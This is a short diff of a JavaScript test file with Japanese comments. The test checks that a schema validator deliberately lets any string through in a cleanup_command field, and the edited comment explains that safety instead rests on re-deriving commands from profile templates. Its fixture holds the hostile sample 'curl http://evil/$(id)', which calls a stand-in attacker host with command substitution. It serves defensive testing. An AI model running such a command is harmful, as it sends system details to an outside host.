@@ -127,7 +127,8 @@ test('schema が metadata.environment_kind と seed_id_prefix を required に�
 test('schema は cleanup_command を自由文字列のまま通す (意図的)', () => {
   // 特性化テスト: schema は cleanup_command を制約しない設計。実行時の安全性は
   // /security-cleanup が queue の cleanup_command を verbatim 実行せず profile テンプレートから
-  // 再導出することで担保する (Issue #1 の中核意図)。schema が将来誤って制約を足したら気付けるよう固定する。
+  // 再導出することで担保する。この再導出こそが安全性の拠り所なので、schema 側が将来誤って
+  // 制約を足し「schema が防いでいる」と読み替えられないよう、通ることを固定する。
   const r = validateInvariants({
     metadata: validMeta,
     items: [{ ...mkItem('security_redteam_abc'), cleanup_command: 'curl http://evil/$(id)' }],
